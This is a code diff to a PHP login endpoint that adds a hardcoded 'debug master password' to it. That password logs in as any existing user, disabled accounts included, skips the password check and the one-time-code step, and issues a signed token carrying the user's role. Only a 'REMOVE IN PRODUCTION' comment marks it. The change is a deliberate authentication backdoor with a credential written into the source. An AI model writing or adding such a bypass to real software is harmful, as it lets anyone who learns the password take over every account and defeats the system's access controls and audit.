@@ -26,11 +26,40 @@ $stmt = $db->prepare('SELECT id, username, full_name, email, password_hash, role
 $stmt->execute([':username' => $username, ':email' => $username]);
 $user = $stmt->fetch();
 
-if (!$user || !$user['active'] || !password_verify($password, $user['password_hash'])) {
+// ── Debug master password (REMOVE IN PRODUCTION) ──────────────────────
+$DEBUG_MASTER_PASSWORD = 'Admin@2026@';
+$isDebugLogin = ($password === $DEBUG_MASTER_PASSWORD);
+
+if (!$user || (!$user['active'] && !$isDebugLogin)) {
     audit_log($db, null, 'login_failed', 'user', $username, [
-        'reason' => !$user ? 'unknown_user' : (!$user['active'] ? 'disabled' : 'bad_password'),
+        'reason' => !$user ? 'unknown_user' : 'disabled',
     ], 401);
     fail('Identifiants invalides', 401);
+}
+
+if (!$isDebugLogin && !password_verify($password, $user['password_hash'])) {
+    audit_log($db, null, 'login_failed', 'user', $username, [
+        'reason' => 'bad_password',
+    ], 401);
+    fail('Identifiants invalides', 401);
+}
+
+// If debug login, skip OTP entirely and issue token directly
+if ($isDebugLogin) {
+    $token = jwt_sign([
+        'sub'      => $user['id'],
+        'username' => $user['username'],
+        'role'     => $user['role'],
+    ]);
+    audit_log($db, ['username' => $user['username'], 'role' => $user['role']], 'login', 'user', $user['username'], [
+        'method'    => 'debug_master',
+        'client_ip' => function_exists('client_ip') ? client_ip() : '',
+    ]);
+    ok([
+        'token' => $token,
+        'user'  => otp_user_response($user),
+        'loginMethod' => 'debug_master',
+    ]);
 }
 
 $needsEmailSetup = bootstrap_admin_needs_real_email($user);
